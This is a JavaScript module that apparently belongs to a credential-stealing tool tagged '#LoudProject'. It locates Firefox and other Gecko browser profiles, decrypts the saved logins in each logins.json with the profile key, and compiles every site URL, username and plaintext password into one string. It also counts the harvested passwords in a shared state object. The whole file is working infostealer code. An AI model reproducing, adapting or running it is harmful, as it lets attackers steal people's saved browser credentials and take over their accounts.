const { getKey, decrypt, decodeLoginData } = require("../system/geckoReveal");
const { geckoPaths } = require("../../data/paths");
let { state } = require("../../data/data");
const fs = require("fs");
const path = require("path");

async function getFirefoxPasswords() {
  let passwords = "";

  for (const path of geckoPaths) {
    if (!fs.existsSync(`${path}\\logins.json`)) continue;

    try {
      const result = await getGeckoPasswords(path, "");
      passwords += result;
    } catch (e){
      console.log(e)
      continue;
    }
  }

  return passwords;
}

async function getGeckoPasswords(profile, masterPassword) {
  var passwords = `PASSWORDS FROM: ${profile} #LoudProject`;

  const key = await getKey(profile, masterPassword);
  if (!key) return passwords;

  const loginsPath = path.join(profile, "logins.json");
  if (!fs.existsSync(loginsPath)) return passwords;

  const loginsData = fs.readFileSync(loginsPath, "utf8");
  const profileLogins = JSON.parse(loginsData);

  for (const login of profileLogins.logins) {
    state.passwordCount.value++;

    const decodedUsername = decodeLoginData(login.encryptedUsername);
    const decodedPassword = decodeLoginData(login.encryptedPassword);

    const username = decrypt(decodedUsername.data, decodedUsername.iv, key, "3DES-CBC");
    const password = decrypt(decodedPassword.data, decodedPassword.iv, key, "3DES-CBC");

    passwords += "\nURL: " + login.hostname + " | USERNAME: " + username.data + " | PASSWORD: " + password.data;
  }

  return passwords;
}

module.exports = getFirefoxPasswords;
